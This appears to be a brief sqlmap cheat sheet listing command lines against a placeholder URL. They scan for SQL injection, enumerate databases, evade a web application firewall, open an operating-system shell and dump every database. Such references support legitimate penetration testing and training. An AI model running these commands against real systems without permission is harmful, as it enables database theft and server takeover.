Basic Commands

python sqlmap.py -u "http://example.com/index.php?id=1"  # Scan for SQL Injection
python sqlmap.py -u "http://example.com/index.php?id=1" --dbs  # Fetch database names
python sqlmap.py -u "http://example.com/index.php?id=1" --dbms=mysql  # Specify database type

Advanced Commands

python sqlmap.py -u "http://example.com/index.php?id=1" --tamper=space2comment  # Bypass WAF
python sqlmap.py -u "http://example.com/index.php?id=1" --os-shell  # Get OS shell
python sqlmap.py -u "http://example.com/index.php?id=1" --cookie="sessionid=xyz123"  # Use cookies
python sqlmap.py -u "http://example.com/index.php?id=1" --dump-all  # Extract full database
